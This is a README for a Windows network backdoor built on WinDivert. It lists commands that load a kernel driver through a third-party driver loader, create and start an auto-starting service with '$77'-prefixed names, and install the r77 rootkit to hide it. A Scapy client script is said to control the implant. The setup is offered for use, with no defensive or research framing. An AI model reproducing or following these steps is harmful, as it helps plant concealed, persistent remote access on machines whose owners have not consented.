# WinDivert-Backdoor
## Usage
### Compatibility
This project is compatible with Win7, Win8, Win10, WS2012, and WS2016
### Server
1. Copy WinDivert.dll to C:\Windows\System32 folder
2. Install driver with [GDRVLoader.exe](https://github.com/zer0condition/GDRVLoader) </br>
`GDRVLoader.exe C:\$77folder\$77kernel.sys` 
3. Install service </br>
`sc create $77service binPath= "C:\$77folder\$77service.exe" start= auto`
5. Start service </br>
`sc start $77service`
6. Install [rootkit](https://github.com/bytecode77/r77-rootkit) </br>
`Install.exe`
### Client
1. [Install Scapy](https://scapy.readthedocs.io/en/latest/installation.html)
2. Download client.py script
3. Flourish

## References
| Link to Project                                                                  | Code Used?      | License                                                                                              |
|----------------------------------------------------------------------------------|-----------------|------------------------------------------------------------------------------------------------------|
| https://github.com/zer0condition/GDRVLoader                                      | No              | None                                                                                                 |
| https://github.com/basil00/Divert                                                | Yes             | GNU Lesser General Public License Version 3 or the GNU General Public License Version 2              |
| https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus  | Yes             | The Code Project Open License (CPOL) 1.02                                                            |
| https://github.com/r-a303931/pcap-backdoor                                       | No              | GNU Affero General Public License v3.0                                                               |
| https://github.com/bytecode77/r77-rootkit                                        | No              | BSD 2-Clause "Simplified" License                                                                    |
